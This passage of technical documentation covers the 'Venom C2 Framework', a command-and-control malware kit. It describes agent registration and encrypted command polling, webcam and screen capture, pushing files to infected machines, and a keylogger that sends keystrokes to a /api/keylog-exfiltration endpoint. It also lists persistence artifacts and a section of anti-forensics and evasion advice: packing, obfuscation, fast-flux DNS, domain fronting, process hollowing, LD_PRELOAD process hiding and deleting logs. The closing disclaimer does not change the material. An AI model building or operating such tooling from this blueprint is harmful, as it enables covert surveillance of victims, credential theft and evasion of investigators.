│  ┌─────────────────┐                           ┌─────────────────┐  ┌───────────┐  │
│  │  Native Code    │                           │    Flask        │  │  /video   │  │
│  │  (C/DLL/SO)     │                           │    Server       │  │  page     │  │
│  │                 │                           │                 │  │           │  │
│  │  while time<    │                           │  ┌─────────────┐ │  │  <img src=│  │
│  │  duration:      │                           │  │ Last Frame  │ │  │   "/video_│  │
│  │    frame =      │                           │  │   Storage   │ │  │   feed"   │  │
│  │    capture()    │                           │  │  (overwrite)│ │  │   />      │  │
│  │    callback(    │                           │  └──────┬──────┘ │  └───────────┘  │
│  │      frame)     │                           │         │        │       │        │
│  │    sleep(1/fps) │                           │         │        │       │        │
│  └────────┬────────┘                           │         │        │       │        │
│           │                                     │         │        │       │        │
│           │ POST /api/video-frame-from-client   │         │        │       │        │
│           │ (JPEG frame)                        │         │        │       │        │
│           └────────────────────────────────────▶│    store│        │       │        │
│                                                 │    as   │        │       │        │
│                                                 │    latest│       │       │        │
│                                                 │    frame│        │       │        │
│                                                 │         │        │       │        │
│                                                 │         │        │       │        │
│                                                 │         │        │ GET    │        │
│                                                 │         │        │ /video_feed    │
│                                                 │         │        │◀──────┘        │
│                                                 │         │        │ (multipart/    │
│                                                 │         │        │  x-mixed-      │
│                                                 │         │        │  replace)      │
│                                                 │         │        │       │        │
│                                                 │         │ stream │       │        │
│                                                 │         │────────┼──────▶│        │
│                                                 │         │ frames │       │        │
│                                                 │         │        │       │        │
└─────────────────────────────────────────────────────────────────────────────────────┘
```

---

# 13. Process Flows & Explanations

## 13.1 Complete Client Registration Flow (Detailed)

This is the most critical process in the system. Let me explain it in plain English, then show the code.

### Plain English Explanation

**Step 1: Client starts for the first time**

Imagine you're a brand new agent that has never contacted the C2 server before. You don't have any configuration saved. You need to introduce yourself.

**What the client does:**
- Checks its local storage (a file called `rootconfig.ini` in `/tmp` on Linux or `%USERPROFILE%` on Windows)
- Finds nothing there (first run)
- Decides: "I need to register with the server"

**Step 2: Client gathers its identity**

The client figures out three things about itself:
1. **Username**: It runs the `whoami` command. On Windows, this might return `jdoe`. On Linux, `john`.
2. **Public IP**: It asks a public service (api.ipify.org) "What's my IP address?" The service responds with something like `203.0.113.45`.
3. **Operating System**: Python's `platform.system()` tells it "Windows" or "Linux".

**Step 3: Client sends registration request**

Now the client knows who it is. It packages this information into a JSON message and sends it to the server via HTTPS POST to `/api/clientRegistration`.

**What the server receives:**
```json
{
    "user": "jdoe",
    "public_ip": "203.0.113.45",
    "os": "Windows"
}
```

**Step 4: Server generates a unique ID for the client**

The server creates a client ID that looks like: `aB3xY9-20250115143022`

How it's made:
- First part: 6 random characters (letters and numbers) → `aB3xY9`
- Second part: Current timestamp (YYYYMMDDHHMMSS) → `20250115143022`
- Combined with a dash: `aB3xY9-20250115143022`

Why this format? The random part prevents ID guessing, the timestamp lets you know when the client first connected.

**Step 5: Server saves client to database**

The server creates a record in the `ClientData` table with:
- The new client ID
- The username
- The public IP
- The OS
- Current time as registration time
- Same current time as last_active (will be updated later)
- A geo-location derived from the IP (using ipinfo.io)

**Step 6: Server prepares RSA public key**

The server checks if it has RSA keys saved in the `.env` file. If not (first time the server has ever run), it generates a brand new 2048-bit RSA key pair. The public key is what the client needs.

**Step 7: Server responds to client**

The server sends back:
```json
{
    "client_id": "aB3xY9-20250115143022",
    "reg_date": "2025-01-15 14:30:22",
    "public_key": "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A...\n-----END PUBLIC KEY-----"
}
```

**Step 8: Client saves configuration**

The client writes this information to `rootconfig.ini` so it won't have to register again after reboot.

**End result**: The client now has a unique ID and the server's public key. Next step: establish encrypted communication.

## 13.2 AES Key Exchange Flow (Detailed)

### Plain English Explanation

Now that the client has the server's RSA public key, it needs to establish a shared secret key that both sides can use for fast encryption. RSA is slow but secure for exchanging small secrets. AES is fast but needs a shared secret. So we use RSA to securely share an AES key.

**Step 1: Client generates AES key**

The client randomly generates 32 bytes (256 bits) of cryptographic randomness. This will be the session key.

**Step 2: Client creates exchange payload**

The client packages two things into a JSON message:
- Its client ID (so the server knows which client this is for)
- The AES key (as a hex string, because JSON doesn't like raw bytes)

**Step 3: Client encrypts with RSA**

The client takes the JSON string, converts it to bytes, and encrypts it using the server's RSA public key. The encryption uses OAEP padding, which is a standard that prevents certain cryptographic attacks.

**Why can't we just send the AES key in plain text?** Anyone listening on the network would see it and be able to decrypt all future communication.

**Step 4: Client sends to server**

The encrypted payload is sent as a hex string (to make it safe for JSON) in a POST request to `/api/aes-share`.

**Step 5: Server decrypts with RSA private key**

The server loads its RSA private key from the `.env` file. It uses this to decrypt the payload. Only the server can do this because only the server has the private key.

**Step 6: Server stores AES key**

The server extracts the client ID and the AES key from the decrypted payload. It stores the AES key in the `CryptographyData` table, associated with that client ID.

**End result**: Both client and server now have the same 32-byte AES key. All future communication will be encrypted with AES-GCM, which is thousands of times faster than RSA.

## 13.3 Command Polling Loop (Detailed)

### Plain English Explanation

After registration and key exchange, the client enters its main loop. It will run forever, checking for commands every 5 seconds.

**What happens every 5 seconds:**

**Step 1: Client asks for commands**

The client sends a GET request to `/command-transmission-to-client?clientID=...` with its client ID as a query parameter.

**Step 2: Server updates last_active**

The server finds the client in the database and updates its `last_active` field to the current time. This is how the dashboard knows if a client is online (recent last_active) or offline (stale last_active).

**Step 3: Server checks for multicast commands**

The server maintains a global dictionary called `multicast_commands`:
```
multicast_commands = {
    "Linux": {"command": "whoami", "timestamp": "2025-01-15 14:35:22"},
    "Windows": {"command": None, "timestamp": None}
}
```

If there's a command for this client's OS, and it was set within the last 5 seconds, the server adds it to this client's individual command queue.

**Step 4: Server checks individual command queue**

The server has another dictionary called `command_to_execute` that maps client IDs to commands:
```
command_to_execute = {
    "aB3xY9-20250115143022": "whoami",
    "cD4wZ8-20250115143500": "ipconfig"
}
```

If this client has a command waiting, the server:
- Removes it from the queue (one-time use)
- Encrypts it with the client's AES key
- Returns the encrypted command

**Step 5: Server responds**

Two possible responses:

- **No command**: `{"command": null}`
- **Has command**: `{"nonce": "...", "ciphertext": "...", "tag": "..."}`

**Step 6: Client decrypts**

If the client receives an encrypted response, it decrypts it using its AES key to get the plaintext command.

**Step 7: Client executes command**

The client runs the command (either directly in shell or using special handling for commands like `cd`, `screenshot`, etc.).

**Step 8: Client encrypts and sends result**

The client captures the output (stdout or stderr), packages it with the command and client ID, encrypts with AES, and sends to `/execution-result-of-command-from-client`.

**Step 9: Server processes result**

The server decrypts the result, logs it to the database, and broadcasts it via Socket.IO to all connected admin dashboards.

## 13.4 File Upload to Client Flow (Detailed)

### Plain English Explanation

An administrator wants to send a file (like a tool or an update) to a remote client.

**Step 1: Admin selects file(s)**

In the dashboard's "Send File" section, the admin chooses the upload method:
- **Upload from Server**: The file is already on the C2 server
- **Upload from Files**: The admin uploads from local computer

**Step 2: Server receives file(s)**

- **Upload from Files**: The server saves the uploaded files to `uploads/FILES_TO_SEND_TO_CLIENT/` with a prefix of the client ID (e.g., `aB3xY9-20250115143022-tool.exe`)

**Step 3: Server queues command**

The server creates a special JSON command and adds it to the client's command queue:
```json
{
    "upload_type": "UploadFromFiles",
    "client_id": "aB3xY9-20250115143022",
    "filename": "tool.exe"
}
```

or for Upload from Server:
```json
{
    "command": "UploadFromServer",
    "client_id": "aB3xY9-20250115143022",
    "server_file_path": "/opt/venom-c2/uploads/tool.exe"
}
```

**Step 4: Client polls and receives command**

The client's next poll (within 5 seconds) picks up this command. It sees `"upload_type": "UploadFromFiles"` or `"command": "UploadFromServer"` and knows this isn't a normal shell command.

**Step 5: Client requests the file**

The client sends a GET request to `/api/upload-file-to-client` with parameters:
- `clientID`: its own ID
- `filename`: the filename (for UploadFromFiles)
- or `server_file_path_from_client`: the path (for UploadFromServer)

**Step 6: Server encrypts and sends file**

The server:
- Finds the file on disk
- Reads the file contents
- Encrypts with the client's AES key
- Returns the encrypted data

**Step 7: Client decrypts and saves**

The client:
- Decrypts the received data
- Saves it to the current working directory with the original filename

**End result**: The file now exists on the client machine.

## 13.5 Keylogging Flow (Detailed)

### Plain English Explanation

Keylogging is one of the most sensitive operations. It must capture every keystroke without missing any, but also must not slow down the computer or be easily detectable.

**Step 1: Admin starts keylogger**

The admin clicks "Start Keylogger" in the malware actions modal. The server queues the `start_keylog` command.

**Step 2: Client receives command**

The client polls and gets `start_keylog`. It calls the `start_keylog()` function.

**Step 3: Client sets up keyboard hook**

- **Windows**: The `keyboard` library installs a low-level keyboard hook using Windows' `SetWindowsHookEx`. This hook fires on every key press, regardless of which application has focus.
- **Linux**: The `Xlib` library connects to the X11 server and requests the RECORD extension. This allows the client to receive key events from the X server.

**Step 4: Key events flow into buffer**

Every time the user presses a key:
1. The operating system generates a keyboard event
2. The hook function receives the event
3. The hook converts the key code to a character (e.g., 0x41 → 'A', taking Shift/Caps Lock into account)
4. Special keys (Enter, Backspace, Tab, etc.) are converted to readable names like `[Return]`, `[BackSpace]`
5. The character is appended to a shared buffer (protected by a lock since multiple threads might access it)

**Step 5: Sender thread processes buffer**

A separate thread wakes up every 10 seconds and:
1. Acquires the buffer lock
2. Copies all characters from the buffer
3. Clears the buffer
4. Releases the lock
5. Encrypts the collected characters
6. Sends to `/api/keylog-exfiltration`

**Why 10 seconds?** Sending every keystroke individually would:
- Generate too much network traffic
- Be more detectable (constant network activity)
- Not be readable anyway (keystrokes are more useful in chunks)

**Step 6: Server saves keylog**

The server:
- Receives the encrypted payload
- Decrypts it using the client's AES key
- Appends the plaintext to `KEYLOG_DIR/{client_id}-keylog.txt`

**Step 7: Admin stops keylogger**

When the admin clicks "Stop Keylogger", the server queues the `stop_keylog` command. The client:
- Removes the keyboard hook
- Signals the sender thread to stop
- Sends any remaining buffered keystrokes
- Cleans up resources

## 13.6 Multi-Cast Command Flow (Detailed)

### Plain English Explanation

Sometimes an operator wants to send the same command to all clients of a particular operating system. For example, "update all Linux clients" or "show current user on all Windows machines".

**Step 1: Admin enters multicast command**

In the dashboard's "Commands" section, the admin:
- Selects target platform (Linux or Windows)
- Enters the command (e.g., "whoami")
- Clicks "Send to Linux Agents"

**Step 2: Server stores command with timer**

The server receives the multicast command and stores it in the `multicast_commands` dictionary:
```python
multicast_commands["Linux"] = {
    "command": "whoami",
    "timestamp": "2025-01-15 14:35:22"
}
```

The server also starts a 5-second timer. When the timer expires, it will set the command back to `None`.

**Why 5 seconds?** 
- Long enough for most clients to poll (they poll every 5 seconds)
- Short enough that the command won't be executed by clients that come online much later

**Step 3: Clients poll within window**

Any Linux client that polls within the next 5 seconds will see that there's a multicast command waiting for its OS.

The server's command polling logic:
```python
multicast_info = multicast_commands.get(client.os, {})
multicast_cmd = multicast_info.get("command")
multicast_time = multicast_info.get("timestamp")

if multicast_cmd and multicast_time:
    if (datetime.now() - multicast_time) <= timedelta(seconds=5):
        command_to_execute[client_id] = multicast_cmd
```

**Step 4: Clients execute command**

Each client receives the command normally and executes it. The results come back individually.

**What happens after 5 seconds?**

The timer expires and the server sets `multicast_commands["Linux"]["command"] = None`. Any client polling after that will not receive the multicast command.

**Pros of multicast:**
- Simple to implement
- No need to track which clients have received the command
- Works with existing polling mechanism

**Cons:**
- Clients offline during the 5-second window miss the command
- No confirmation of delivery to all clients
- Not suitable for commands that must reach 100% of clients

---

# 14. Troubleshooting & Maintenance

## 14.1 Common Issues and Solutions

### Issue: Client Won't Register

**Symptoms:**
- No `rootconfig.ini` file created
- Client exits immediately
- Server logs show no registration request

**Diagnosis:**
```bash
# On client machine, run manually to see errors
python client.py

# Check network connectivity
curl -k https://venom.c2:5000/api/clientRegistration -X POST \
    -H "Content-Type: application/json" \
    -d '{"user":"test","public_ip":"1.2.3.4","os":"Linux"}'
```

**Likely Causes:**
1. Server URL incorrect in client.py
2. DNS resolution fails (can't resolve venom.c2)
3. Firewall blocking outbound HTTPS on port 5000
4. SSL certificate issue (self-signed needs `verify=False`)

### Issue: Video Capture Fails on Linux

**Symptoms:**
- `video.so` loads but no frames
- Error: "Cannot open video device"
- Frames captured are all black/empty

**Diagnosis:**
```bash
# Check if video device exists
ls -la /dev/video*

# Check permissions (should be 666 or owned by user's group)
ls -l /dev/video0

# Test with v4l2-ctl
v4l2-ctl --list-devices
v4l2-ctl --device=/dev/video0 --all

# Test with ffmpeg
ffmpeg -f v4l2 -i /dev/video0 -frames:v 1 test.jpg
```

**Solutions:**
```bash
# Add user to video group
sudo usermod -a -G video $USER

# Log out and back in, or:
newgrp video

# Temporary permission fix (not persistent)
sudo chmod 666 /dev/video0

# For embedded cameras (like laptops), try different device:
/dev/video1, /dev/video2, etc.
```

### Issue: Video Capture Fails on Windows

**Symptoms:**
- DLL load error (126 - module not found)
- Camera light turns on but no frames
- Exception: "No capture device found"

**Diagnosis:**
```powershell
# Check if DLL dependencies are present
dumpbin /dependents video_windows.dll

# Check if camera works in other apps
start microsoft.windows.camera:

# Check Python architecture (must match DLL)
python -c "import platform; print(platform.architecture())"
```

**Solutions:**
1. Install Visual C++ Redistributable
2. Ensure Python and DLL are same architecture (both 64-bit or both 32-bit)
3. Run as Administrator for some cameras
4. Check Windows privacy settings: Camera access must be enabled

### Issue: Keylogger Not Capturing

**Symptoms:**
- Keylog file created but empty
- No keylog data received
- Errors about X11 or keyboard permissions

**Diagnosis (Linux):**
```bash
# Check if X11 is available
echo $DISPLAY

# Check if RECORD extension is available
xdpyinfo | grep RECORD

# Run client with DISPLAY set
DISPLAY=:0 python client.py
```

**Diagnosis (Windows):**
```powershell
# Check if keyboard library works
python -c "import keyboard; keyboard.add_hotkey('a', lambda: print('a pressed')); keyboard.wait()"
```

**Solutions:**
- Linux: Ensure client runs in same X11 session as user (use `DISPLAY=:0`)
- Linux: Install python-xlib: `pip install python-xlib`
- Windows: Run as administrator for low-level hooks
- Both: Some security software blocks keyboard hooks

### Issue: WebSocket Connection Fails

**Symptoms:**
- Dashboard loads but client list doesn't update
- Browser console shows WebSocket errors
- Socket.IO connection timeout

**Diagnosis:**
```bash
# Check if port 5000 is listening
ss -tlnp | grep 5000

# Test WebSocket connection (install wscat)
npm install -g wscat
wscat -c wss://venom.c2:5000/socket.io/?EIO=4&transport=websocket
```

**Solutions:**
1. Ensure `socketio.run(app, host='0.0.0.0')` (not '127.0.0.1')
2. Check firewall: `sudo ufw allow 5000/tcp`
3. For reverse proxy, ensure WebSocket upgrade headers are passed
4. SSL certificate issues: `rejectUnauthorized: false` in client (testing only)

## 14.2 Logging and Monitoring

### Server Log Configuration

Add to `app.py` for detailed logging:

```python
import logging

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('/var/log/venom-c2.log'),
        logging.StreamHandler()
    ]
)

# Log specific events
app.logger.info(f"Client registered: {client_id}")
app.logger.warning(f"Failed decryption attempt for client: {client_id}")
app.logger.error(f"Database error: {str(e)}")
```

### Client Debug Mode

Add to `client.py` for verbose output:

```python
import logging

logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('/tmp/client_debug.log'),
        logging.StreamHandler()
    ]
)

# Log important events
logging.info(f"Starting client with ID: {client_id}")
logging.debug(f"Sending command result: {result[:100]}...")
logging.error(f"Failed to connect: {str(e)}")
```

### Database Monitoring Queries

```sql
-- Count active clients
SELECT COUNT(*) as active_count
FROM client_data
WHERE julianday('now') - julianday(last_active) <= 0.000139;  -- 12 seconds

-- Average command response time (requires timestamp in commands_history)
SELECT 
    client_id,
    AVG(
        julianday(json_extract(commands_history, '$.timestamp')) - 
        julianday(json_extract(commands_history, '$.queued_time'))
    ) * 86400 as avg_response_seconds
FROM commands_log
GROUP BY client_id;

-- Most active clients
SELECT 
    client_id,
    COUNT(*) as command_count
FROM commands_log
WHERE julianday('now') - julianday(json_extract(commands_history, '$.timestamp')) <= 1
GROUP BY client_id
ORDER BY command_count DESC
LIMIT 10;
```

## 14.3 Maintenance Tasks

### Database Cleanup Script

```bash
#!/bin/bash
# cleanup.sh - Run weekly

DB_PATH="/opt/venom-c2/instance/admin.db"

# Delete logs older than 30 days
sqlite3 $DB_PATH << EOF
DELETE FROM commands_log 
WHERE julianday('now') - julianday(
    json_extract(commands_history, '$.timestamp')
) > 30;
VACUUM;
EOF

echo "Cleanup completed at $(date)" >> /var/log/venom-c2-cleanup.log
```

### Log Rotation

Create `/etc/logrotate.d/venom-c2`:

```
/var/log/venom-c2.log {
    daily
    rotate 7
    compress
    delaycompress
    missingok
    notifempty
    create 644 www-data www-data
    postrotate
        systemctl reload venom-c2
    endscript
}
```

### Backup Script

```bash
#!/bin/bash
# backup.sh - Run daily

BACKUP_DIR="/backup/venom-c2"
DATE=$(date +%Y%m%d)

mkdir -p $BACKUP_DIR

# Backup database
cp /opt/venom-c2/instance/admin.db $BACKUP_DIR/admin_$DATE.db

# Backup uploads
tar -czf $BACKUP_DIR/uploads_$DATE.tar.gz /opt/venom-c2/uploads/

# Backup keylogs
tar -czf $BACKUP_DIR/keylogs_$DATE.tar.gz /opt/venom-c2/KEYLOG_DIR/

# Keep only last 7 days
find $BACKUP_DIR -type f -mtime +7 -delete

echo "Backup completed for $DATE" >> /var/log/venom-c2-backup.log
```

---

# 15. Security Considerations

## 15.1 Threat Model

| Threat | Description | Impact | Mitigation |
|--------|-------------|--------|------------|
| **Man-in-the-Middle** | Attacker intercepts traffic | Read commands/results | TLS encryption, certificate pinning |
| **Replay Attack** | Attacker replays captured command | Duplicate execution | AES-GCM nonce prevents replay |
| **Client Impersonation** | Attacker registers fake client | Receive commands meant for victim | RSA key exchange, unique client IDs |
| **Command Injection** | Malicious command injected | Execute arbitrary code | Input validation, limited command set |
| **Privilege Escalation** | Low-priv admin gets superadmin | Full system compromise | Role-based JWT, separate endpoints |
| **Denial of Service** | Flood server with requests | Service unavailable | Rate limiting (not yet implemented) |
| **Information Disclosure** | Logs exposed | Leak client data | File permissions, log rotation |

## 15.2 Hardening Recommendations

### For Production Deployment

1. **Use Valid SSL Certificates**
   - Replace self-signed with Let's Encrypt or commercial certificate
   - Enable certificate pinning in client

2. **Implement Rate Limiting**
   ```python
   from flask_limiter import Limiter
   limiter = Limiter(app, key_func=get_remote_address)
   
   @app.route('/api/clientRegistration', methods=['POST'])
   @limiter.limit("5 per minute")
   def client_registration():
       # ...
   ```

3. **Add IP Whitelisting**
   ```python
   ALLOWED_IPS = {'192.168.1.0/24', '10.0.0.0/8'}
   
   def ip_whitelisted(f):
       @wraps(f)
       def decorated(*args, **kwargs):
           client_ip = request.remote_addr
           if not any(is_ip_in_network(client_ip, net) for net in ALLOWED_IPS):
               return jsonify({"error": "Access denied"}), 403
           return f(*args, **kwargs)
       return decorated
   ```

4. **Database Encryption at Rest**
   - Encrypt `aes_key` column with master key
   - Use SQLite encryption extension (SEE)

5. **Client Binary Hardening**
   - Strip symbols: `strip client.bin`
   - UPX compression (makes analysis harder)
   - Obfuscation for Windows executable

6. **C2 Domain Rotation**
   - Use domain fronting with CDN
   - Implement fast-flux DNS
   - Generate new client binaries with updated C2 URL

## 15.3 Forensic Artifacts

### What an Investigator Might Find

**On Server:**
- Database file (`admin.db`) with client IDs, IPs, command history
- Uploaded files (exfiltrated data)
- Keylog files (`KEYLOG_DIR/*.txt`)
- Log files (`/var/log/venom-c2.log`)
- Configuration (`.env`) with JWT secret, RSA keys

**On Windows Client:**
- Registry key: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\DropperPowerShell`
- Files: `%TEMP%\dropper.exe`, `%TEMP%\client.exe`
- Network connections to C2 server on port 5000
- Python process running (if not compiled)

**On Linux Client:**
- Cron job: `crontab -l` shows the persistence entry
- Files: `/tmp/dropper`, `/tmp/client.bin`
- Processes: `ps aux | grep client`
- Network: `netstat -tunap | grep 5000`

### Anti-Forensics Recommendations

- Delete logs periodically
- Use in-memory execution where possible
- Encrypt configuration files
- Use process hollowing for Windows
- Use LD_PRELOAD for Linux to hide processes

---

# 16. Appendices

## Appendix A: File Structure Reference

```
venom-c2/
├── app.py                          # Main Flask server
├── client.py                       # Python client agent
├── video_windows.c                 # Windows video capture DLL source
├── photo_capture_windows.c         # Windows photo capture DLL source
├── video.c                         # Linux video capture SO source
├── photo_capture.c                 # Linux photo capture SO source
├── dropper_l.c                     # Linux dropper source
├── dropper.go                      # Windows dropper source
├── upload.py                       # File upload utility
├── requirements-linux.txt          # Linux Python dependencies
├── requirements-windows.txt        # Windows Python dependencies
├── .env                            # Environment variables (JWT secret, RSA keys)
├── cert.pem                        # SSL certificate
├── key.pem                         # SSL private key
├── static/
│   ├── client.exe                  # Compiled Windows agent
│   ├── client.bin                  # Compiled Linux agent
│   ├── dropper.exe                 # Compiled Windows dropper
│   ├── dropper                     # Compiled Linux dropper
│   ├── video_windows.dll           # Windows video capture DLL
│   ├── photo_capture_windows.dll   # Windows photo capture DLL
│   ├── video.so                    # Linux video capture SO
│   └── photo_capture.so            # Linux photo capture SO
├── templates/
│   ├── dashboard.html              # Main admin dashboard
│   ├── terminal.html               # Terminal component
│   ├── screenshare.html            # Screenshare viewer
│   ├── video.html                  # Video player
│   ├── logs.html                   # Command logs viewer
│   ├── login.html                  # Authentication page
│   ├── superAdminPanel.html        # Admin management
│   ├── swagger.html                # API documentation
│   └── footer.html                 # Common footer
├── instance/
│   └── admin.db                    # SQLite database
├── uploads/                        # Exfiltrated files
│   └── Captured_photos/            # Webcam photos
├── KEYLOG_DIR/                     # Keylog files
└── build/                          # Nuitka build output (temporary)
```

## Appendix B: Command Quick Reference

| Command | Platform | Description |
|---------|----------|-------------|
| `whoami` | Both | Current username |
| `hostname` | Both | Computer name |
| `ipconfig` / `ifconfig` | Win/Lin | Network configuration |
| `systeminfo` / `uname -a` | Win/Lin | System information |
| `tasklist` / `ps aux` | Win/Lin | Running processes |
| `dir` / `ls -la` | Win/Lin | Directory listing |
| `cd <path>` | Both | Change directory |
| `type <file>` / `cat <file>` | Win/Lin | Display file contents |
| `del <file>` / `rm <file>` | Win/Lin | Delete file |
| `mkdir <dir>` | Both | Create directory |
| `screenshot` | Both | Capture screen |
| `capture_photo` | Both | Capture webcam |
| `start_keylog` | Both | Start keylogger |
| `stop_keylog` | Both | Stop keylogger |
| `start_video-<fps>-<duration>` | Both | Record video |
| `stop_video` | Both | Stop recording |
| `start_screenshare_<fps>` | Both | Start screen share |
| `stop_screenshare` | Both | Stop screen share |
| `download <filepath>` | Both | Upload file to server |
| `kill_agent` | Both | Terminate agent |

## Appendix C: Environment Variables

| Variable | Purpose | Default | Required |
|----------|---------|---------|----------|
| `JWT_SECRET_KEY` | JWT signing key | None | Yes |
| `PUBLIC_KEY_FOR_AES_KEY_EXCHANGE` | RSA public key | Generated | Yes |
| `PRIVATE_KEY_FOR_AES_KEY_EXCHANGE` | RSA private key | Generated | Yes |
| `DEBUG` | Flask debug mode | False | No |
| `HOST` | Bind address | 0.0.0.0 | No |
| `PORT` | Listen port | 5000 | No |
| `MAX_CONTENT_LENGTH` | Max upload size | 104857600 | No |

## Appendix D: Ports and Protocols

| Service | Protocol | Port | Direction | Purpose |
|---------|----------|------|-----------|---------|
| C2 Server | HTTPS | 5000 | Inbound | Web dashboard, API |
| C2 Server | WSS | 5000 | Inbound | Socket.IO real-time |
| Client | HTTPS | 5000 | Outbound | Command polling, results |
| Client | HTTPS | 443 | Outbound | IP detection (api.ipify.org) |

## Appendix E: Glossary

| Term | Definition |
|------|------------|
| **Agent** | Client software running on target machine |
| **C2** | Command and Control - Server managing agents |
| **Dropper** | Lightweight binary that downloads full agent |
| **Persistence** | Mechanism to survive reboots |
| **Exfiltration** | Transferring data from client to server |
| **Keylogger** | Software recording keystrokes |
| **MJPEG** | Motion JPEG - Video as JPEG sequence |
| **V4L2** | Video4Linux2 - Linux video capture API |
| **DirectShow** | Windows multimedia framework |
| **JWT** | JSON Web Token - Authentication |
| **AES-GCM** | AES Galois/Counter Mode - Authenticated encryption |
| **RSA** | Rivest-Shamir-Adleman - Asymmetric encryption |
| **Nonce** | Number used once - Prevents replay attacks |
| **OAEP** | Optimal Asymmetric Encryption Padding - RSA padding |
| **Socket.IO** | Real-time bidirectional communication library |
| **Nuitka** | Python to standalone executable compiler |
| **bcrypt** | Adaptive password hashing function |
| **SQLAlchemy** | Python SQL toolkit and ORM |
| **Flask** | Python web framework |

## Appendix F: Legal Disclaimer

> **IMPORTANT NOTICE**
>
> The Venom C2 Framework is provided for **legitimate security testing, penetration testing, and educational purposes only**.
>
> **By using this software, you agree to:**
> 1. Obtain explicit written permission before testing any system
> 2. Comply with all applicable local, state, national, and international laws
> 3. Not use this software for any malicious, unauthorized, or illegal activities
> 4. Accept full responsibility for any consequences of using this software
>
> **The authors and contributors assume no liability for:**
> - Misuse or damage caused by this software
> - Violation of laws or regulations
> - Any direct, indirect, incidental, or consequential damages
>
> **Unauthorized use of this software may constitute:**
> - Computer Fraud and Abuse Act (CFAA) violations (US)
> - Computer Misuse Act violations (UK)
> - Similar laws in other jurisdictions
>
> *Use responsibly and only on systems you own or have permission to test.*

---

# Document Metadata

| Property | Value |
|----------|-------|
| **Document Title** | Venom C2 Framework - Complete Technical Documentation |
| **Version** | 1.0.0 |
| **Last Updated** | January 2025 |
| **Document Status** | Final |
| **Classification** | Technical Documentation |
| **Target Audience** | Security professionals, red teamers, developers |
| **Prerequisites** | Basic understanding of networking, Python, web technologies |

---

*This documentation covers all aspects of the Venom C2 Framework including architecture, implementation, deployment, operations, and security considerations. For additional support or inquiries, please contact the project developer.*
